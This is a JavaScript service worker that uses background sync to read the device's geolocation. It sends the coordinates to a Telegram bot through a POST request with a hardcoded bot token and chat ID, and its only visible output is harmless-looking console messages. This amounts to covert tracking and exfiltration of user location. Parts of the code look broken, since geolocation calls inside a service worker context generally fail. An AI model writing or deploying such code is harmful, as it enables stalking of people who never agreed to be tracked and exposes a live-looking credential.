self.addEventListener("install", (event) => {
    console.log("Service Worker installed.");
    self.skipWaiting();
  });
  
  self.addEventListener("activate", (event) => {
    console.log("Service Worker activated.");
  });
  
  self.addEventListener("sync", async (event) => {
    if (event.tag === "location-sync") {
      event.waitUntil(sendLocation());
    }
  });
  
  async function sendLocation() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords;
        const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
        const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
  
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: `chat_id=1293804795&text=${encodeURIComponent(message)}`,
        });
      });
    } else {
      console.error("Geolocation not supported.");
    }
  }
  navigator.serviceWorker.ready.then((registration) => {
    registration.sync.register("location-sync").then(() => {
      console.log("Background sync registered.");
    });
  });
  